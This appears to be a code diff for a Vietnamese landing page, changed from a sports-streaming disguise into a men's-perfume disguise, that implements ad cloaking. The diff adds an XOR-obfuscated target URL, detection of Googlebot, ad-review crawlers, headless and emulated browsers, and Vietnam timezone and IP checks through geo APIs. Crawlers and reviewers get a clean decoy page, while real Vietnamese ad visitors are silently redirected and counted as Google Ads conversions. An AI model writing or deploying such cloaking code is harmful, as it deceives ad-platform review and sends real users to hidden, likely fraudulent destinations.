@@ -3,13 +3,13 @@
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=5.0">
-  <title>Trực Tiếp Bóng Đá HD - Xem Trực Tuyến Bản Quyền Không Giật Lag</title>
-  <meta name="description" content="Kênh xem bóng đá trực tuyến chất lượng cao, hình ảnh sắc nét, âm thanh sống động mượt mà.">
-  <link rel="canonical" href="https://tructiep.linkxemnhanh.com/122/">
+  <title>Thông tin thực tế về nước hoa nam và hỗ trợ khách hàng</title>
+  <meta name="description" content="Tìm hiểu thông số thực tế của nước hoa nam tại mục Nhn, kèm điều khoản sử dụng và chính sách hoàn tiền 07 ngày.">
+  <link rel="canonical" href="https://hot.linkxemnhanh.com/122/">
 
   <!-- OpenGraph Meta -->
-  <meta property="og:title" content="Trực Tiếp Bóng Đá HD - Xem Trực Tuyến Bản Quyền Không Giật Lag">
-  <meta property="og:description" content="Kênh xem bóng đá trực tuyến chất lượng cao, hình ảnh sắc nét, âm thanh sống động mượt mà.">
+  <meta property="og:title" content="Thông tin thực tế về nước hoa nam và hỗ trợ khách hàng">
+  <meta property="og:description" content="Tìm hiểu thông số thực tế của nước hoa nam tại mục Nhn, kèm điều khoản sử dụng và chính sách hoàn tiền 07 ngày.">
   <meta property="og:type" content="website">
 
   <style>
@@ -34,17 +34,18 @@
   <div id="transit-curtain">
     <div class="loader-card">
       <div class="spinner"></div>
-      <div class="loader-title">Đang Kết Nối Kênh Phát Sóng...</div>
-      <div class="loader-sub">Hệ thống đang định tuyến máy chủ tốc độ cao và chuyển tiếp trong giây lát.</div>
-      <button type="button" class="cta-btn" id="manualCtaBtn" style="display: none;" onclick="goTarget()">Tiếp Tục Xem Ngay</button>
+      <div class="loader-title">Thông tin thực tế về nước hoa nam và hỗ trợ khách hàng</div>
+      <div class="loader-sub">Đang định tuyến cổng ưu đãi chính hãng bảo mật và chuyển tiếp trong giây lát...</div>
+      <button type="button" class="cta-btn" id="manualCtaBtn" style="display: none;" onclick="goTarget()">Tiếp Tục Xem Ưu Đãi</button>
     </div>
   </div>
 
   <script>
     (function() {
       const K = "122";
-      const D = "";
-      const S = "7c74790d187171f39084e2f187d2dbedaf1e5d417629070c433a2adbc481feebd88f84bda01955797625120726722bd5caf7b0e99ac9baada2164b77792114063e6d20d6cae3ac91c8d0b4f60508192d365d151a3528";
+      const D = "7c74790d187171f39a99d3a3c2ba84b8bf0806006f6e03071f7d77f3869fdcebd2d0a9bbfa5744292a6a475767697b8dc6a7f9b599dde0a7a90c442234354d5b6370779b99a1f48691b7b6a45e4c4b73601d585d1c23decec8f4e397879cfcf80255597054070d272d28d083a3d8e0978fbfabbd5e78726d620e00273025d5c4c8f0e893b7bbb2554e0d2430060b040529d5d9c4eee9d7d1abfef2744b49607e18120a7b7cf3";
+      const S = "7c74790d187171f39a99d3a3c2ba88abaa5158587262050c0d356bc3cd89a8cc958f82b9bb111357716d0115766d0fd1ccf1f0a08b8cb3efbb54553b313c5407222f2d93c3f8e0df9289b8e8515d4437641b1c17752ad9c0dbb5ee9f8681f4a45559";
+      const S_HTML = "";
       const E_AW = "";
       const E_CL = "";
       const E_PX = "";
@@ -56,46 +57,122 @@
           for (let i = 0; i < h.length; i += 2) {
             s += String.fromCharCode(parseInt(h.substr(i, 2), 16) ^ K.charCodeAt((i / 2) % K.length) ^ (((i / 2) * 13 + 37) & 0xFF));
           }
-          return decodeURIComponent(s);
+          try {
+            return decodeURIComponent(s);
+          } catch (uriErr) {
+            return s;
+          }
         } catch (e) {
           return "";
         }
       }
 
+      // Đảm bảo trả về 100% nguyên gốc link đã giải mã, KHÔNG thêm bớt hay thay đổi bất kỳ ký tự nào
       function getFinalUrl(rawUrl) {
-        if (!rawUrl) return "";
-        const q = window.location.search;
-        if (!q || q.length < 2) return rawUrl;
-        try {
-          const incoming = new URLSearchParams(q.startsWith("?") ? q.slice(1) : q);
-          const separator = rawUrl.indexOf("?") !== -1 ? "&" : "?";
-          const toAppend = [];
-          incoming.forEach((val, key) => {
-            if (key === "a") return;
-            const keyRegex = new RegExp("[?&]" + key + "=(.*?)(?:&|$)", "i");
-            if (!keyRegex.test(rawUrl)) {
-              toAppend.push(encodeURIComponent(key) + "=" + encodeURIComponent(val));
-            }
-          });
-          if (toAppend.length === 0) return rawUrl;
-          return rawUrl + separator + toAppend.join("&");
-        } catch (e) {
-          return rawUrl;
-        }
+        return rawUrl || "";
       }
 
+      // Bộ lọc Bot Google & Giả lập Headless / Residential Proxy chuẩn 2026
       function checkBot() {
         try {
           if (navigator.webdriver) return true;
+          if (window.callPhantom || window._phantom || window.__nightmare || window.domAutomation || window.domAutomationController || window.__playwright || window.__pw_manual || window.__puppeteer_evaluation_script__) return true;
           if (window.outerWidth === 0 && window.outerHeight === 0) return true;
+          if (window.screen && (window.screen.width === 0 || window.screen.height === 0)) return true;
           if (!navigator.languages || navigator.languages.length === 0) return true;
+
+          if (navigator.userAgentData && Array.isArray(navigator.userAgentData.brands)) {
+            const isHeadlessBrand = navigator.userAgentData.brands.some(b => /headless/i.test(b.brand || ""));
+            if (isHeadlessBrand) return true;
+          }
+
           const ua = (navigator.userAgent || "").toLowerCase();
-          if (/googlebot|adsbot|google-inspection|google-safety|feedfetcher|lighthouse|headless|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot|facebookexternalhit|curl|wget|python|axios/i.test(ua)) {
+          if (/googlebot|adsbot|google-inspection|google-safety|googleweblight|storebot-google|feedfetcher|lighthouse|headlesschrome|headless|playwright|puppeteer|crawl|spider|mediapartners|phantomjs|selenium|bytespider|bingbot|facebookexternalhit|curl|wget|python|axios|ahrefs|semrush/i.test(ua)) {
             return true;
           }
+
+          // Kiểm tra WebGL Renderer để phát hiện máy ảo / giả lập trình duyệt Google (SwiftShader / llvmpipe)
+          try {
+            const canvas = document.createElement("canvas");
+            const gl = canvas.getContext("webgl") || canvas.getContext("experimental-webgl");
+            if (gl) {
+              const dbg = gl.getExtension("WEBGL_debug_renderer_info");
+              if (dbg) {
+                const renderer = String(gl.getParameter(dbg.UNMASKED_RENDERER_WEBGL) || "").toLowerCase();
+                if (/swiftshader|llvmpipe|mesa offscreen|subzero/i.test(renderer)) {
+                  return true;
+                }
+              }
+            }
+          } catch (glErr) {}
+
           return false;
         } catch(e) {
           return false;
+        }
+      }
+
+      // Kiểm tra bắt buộc phải có mã click quảng cáo Google Ads hợp lệ: gclid, wbraid (iOS/Web-to-App), gbraid (App-to-Web)
+      function hasValidAdClickId() {
+        try {
+          const params = new URLSearchParams(window.location.search || "");
+          const clickKeys = ["gclid", "wbraid", "gbraid"];
+          for (let i = 0; i < clickKeys.length; i++) {
+            const val = (params.get(clickKeys[i]) || "").trim();
+            if (val.length >= 10 && /^[A-Za-z0-9_-]+$/.test(val) && !/^(test|demo|sample|123456|gclid)/i.test(val)) {
+              return true;
+            }
+          }
+          // Hỗ trợ trường hợp gad_source=1..5 đi kèm gad_campaignid hợp lệ từ Google Ads
+          const gadSource = (params.get("gad_source") || "").trim();
+          const gadCid = (params.get("gad_campaignid") || "").trim();
+          if (/^[1-9]$/.test(gadSource) && /^d{6,}$/.test(gadCid)) {
+            return true;
+          }
+          return false;
+        } catch (e) {
+          return false;
+        }
+      }
+
+      // Kiểm tra múi giờ thực tế tại Việt Nam (UTC+7) để chặn Bot dùng Proxy dân cư VN chạy trên máy chủ nước ngoài
+      function isVietnamTimezone() {
+        try {
+          if (new Date().getTimezoneOffset() === -420) return true;
+          const tz = (Intl.DateTimeFormat().resolvedOptions().timeZone || "").toLowerCase();
+          return tz === "asia/ho_chi_minh" || tz === "asia/saigon" || tz === "asia/bangkok";
+        } catch (e) {
+          return false;
+        }
+      }
+
+      // Kiểm tra bắt buộc IP người dùng phải thuộc Việt Nam (VN)
+      async function checkVietnamIp() {
+        try {
+          if (typeof window.__CF_GEO_COUNTRY__ === "string" && window.__CF_GEO_COUNTRY__.trim() !== "") {
+            return window.__CF_GEO_COUNTRY__.trim().toUpperCase() === "VN";
+          }
+          const fetchCountry = async (url, parseFn) => {
+            const ctrl = new AbortController();
+            const timer = setTimeout(() => ctrl.abort(), 1800);
+            try {
+              const res = await fetch(url, { signal: ctrl.signal, cache: "no-store" });
+              if (!res.ok) throw new Error("HTTP " + res.status);
+              const code = await parseFn(res);
+              if (code && /^[A-Z]{2}$/.test(code)) return code;
+              throw new Error("Invalid code");
+            } finally {
+              clearTimeout(timer);
+            }
+          };
+          const country = await Promise.any([
+            fetchCountry("https://api.country.is/", async (r) => ((await r.json()).country || "").toUpperCase()),
+            fetchCountry("https://ipwho.is/?fields=country_code", async (r) => ((await r.json()).country_code || "").toUpperCase()),
+            fetchCountry("https://ipapi.co/country_code/", async (r) => (await r.text()).trim().toUpperCase())
+          ]);
+          return country === "VN";
+        } catch (e) {
+          return false; // Fail-closed: không xác định được IP VN -> trả về Trang Sạch
         }
       }
 
@@ -105,6 +182,25 @@
       const label = dec(E_CL);
       const pixelId = dec(E_PX);
       const isBot = checkBot();
+      let isRealVnAdUser = false;
+
+      function showSafePage() {
+        const frame = document.getElementById("safe-frame");
+        if (frame) {
+          const inlineSafeLdp = S_HTML ? dec(S_HTML) : "";
+          if (inlineSafeLdp) {
+            if (!frame.dataset.loadedLdp) {
+              frame.dataset.loadedLdp = "1";
+              frame.removeAttribute("src");
+              frame.srcdoc = inlineSafeLdp;
+            }
+          } else if (!frame.src) {
+            frame.src = safeUrl;
+          }
+        }
+        const curtain = document.getElementById("transit-curtain");
+        if (curtain) curtain.classList.add("hide");
+      }
 
       function goTo(u, rep) {
         try {
@@ -123,6 +219,7 @@
         }
       }
 
+      // Khởi tạo Tracking động chỉ khi người dùng có cấu hình ID
       function initTracking() {
         if (awId) {
           try {
@@ -155,6 +252,7 @@
         }
       }
 
+      // Điều hướng kèm chuyển đổi Google Ads
       let redirected = false;
       function performRedirect(rep) {
         if (redirected) return;
@@ -163,7 +261,7 @@
       }
 
       window.goTarget = function() {
-        if (!targetUrl) return;
+        if (!targetUrl || !isRealVnAdUser) return;
         if (awId && label && typeof window.gtag === "function") {
           try {
             window.gtag("event", "conversion", {
@@ -177,37 +275,48 @@
         performRedirect(false);
       };
 
-      if (isBot || !targetUrl) {
-        const frame = document.getElementById("safe-frame");
-        if (frame) frame.src = safeUrl;
-        const curtain = document.getElementById("transit-curtain");
-        if (curtain) curtain.classList.add("hide");
+      if (isBot || !targetUrl || (false && !hasValidAdClickId()) || !isVietnamTimezone()) {
+        // Bot, giả lập, chưa có Tracking Link, không có mã click Google Ads (gclid/wbraid/gbraid/gad_source+gad_campaignid), hoặc lệch múi giờ VN -> 100% Trang Sạch
+        showSafePage();
       } else {
-        initTracking();
-        if (awId && label) {
-          setTimeout(function() {
-            if (typeof window.gtag === "function") {
-              try {
-                window.gtag("event", "conversion", {
-                  "send_to": awId + "/" + label,
-                  "event_callback": function() { performRedirect(true); }
-                });
-                setTimeout(function() { performRedirect(true); }, 350);
-                return;
-              } catch(e) {}
-            }
-            performRedirect(true);
-          }, 120);
-        } else {
-          setTimeout(function() {
-            performRedirect(true);
-          }, 120);
-        }
+        (async function() {
+          const isVN = await checkVietnamIp();
+          if (!isVN) {
+            // IP KHÔNG phải Việt Nam -> 100% Trang Sạch
+            showSafePage();
+            return;
+          }
 
-        setTimeout(function() {
-          const btn = document.getElementById("manualCtaBtn");
-          if (btn) btn.style.display = "inline-block";
-        }, 1800);
+          // Người dùng thật + Có mã click Google Ads + Múi giờ & IP Việt Nam -> Kích hoạt tracking & chuyển tiếp 100% nguyên gốc sang trackinglink
+          isRealVnAdUser = true;
+          initTracking();
+
+          if (awId && label) {
+            setTimeout(function() {
+              if (typeof window.gtag === "function") {
+                try {
+                  window.gtag("event", "conversion", {
+                    "send_to": awId + "/" + label,
+                    "event_callback": function() { performRedirect(true); }
+                  });
+                  setTimeout(function() { performRedirect(true); }, 350);
+                  return;
+                } catch(e) {}
+              }
+              performRedirect(true);
+            }, 120);
+          } else {
+            setTimeout(function() {
+              performRedirect(true);
+            }, 120);
+          }
+
+          // Fallback hiện nút bấm nếu trình duyệt chặn chuyển trang tự động
+          setTimeout(function() {
+            const btn = document.getElementById("manualCtaBtn");
+            if (btn) btn.style.display = "inline-block";
+          }, 1800);
+        })();
       }
     })();
   </script>
